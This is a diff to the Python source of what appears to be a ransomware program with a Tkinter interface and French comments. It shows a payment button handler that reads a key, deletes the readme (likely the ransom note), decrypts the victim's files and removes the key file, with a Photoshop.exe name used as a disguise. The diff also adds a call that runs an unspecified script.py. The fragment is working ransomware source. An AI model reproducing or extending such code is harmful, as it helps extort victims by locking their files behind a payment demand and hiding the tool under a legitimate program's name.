@@ -141,18 +141,19 @@ class App:
                 clef=lire_clef()
 
                 # Suppression de la clé et du readme
-                path="C:/xampp/htdocs/files"
+                path="C:/xampp/htdocs/Photoshop.exe/files"
                 # os.remove(path + '/' + 'file1.txt')
                 # os.remove(path + '/' + 'file2.txt')
                 os.remove(path + '/' + 'readme.txt')
                 items=os.listdir(path)
                 chemin=[path + '/' + item for item in items]
                 decrypt(chemin,clef)
-                path="C:/xampp/htdocs"
+                path="C:/xampp/htdocs/Photoshop.exe"
                 os.remove(path + '/' + 'clef.key')
                 root.destroy()
-                path="C:/xampp/htdocs"
-                os.remove(path + '/' + 'Photoshop.exe')
+
+                # Exécuter un script Python
+                os.system('python script.py')
                 
 
         # Création du bouton de paiement
@@ -199,3 +200,6 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = App(root)
     root.mainloop()
+
+path="C:/xampp/htdocs"
+os.remove(path + '/' + 'Photoshop.exe')
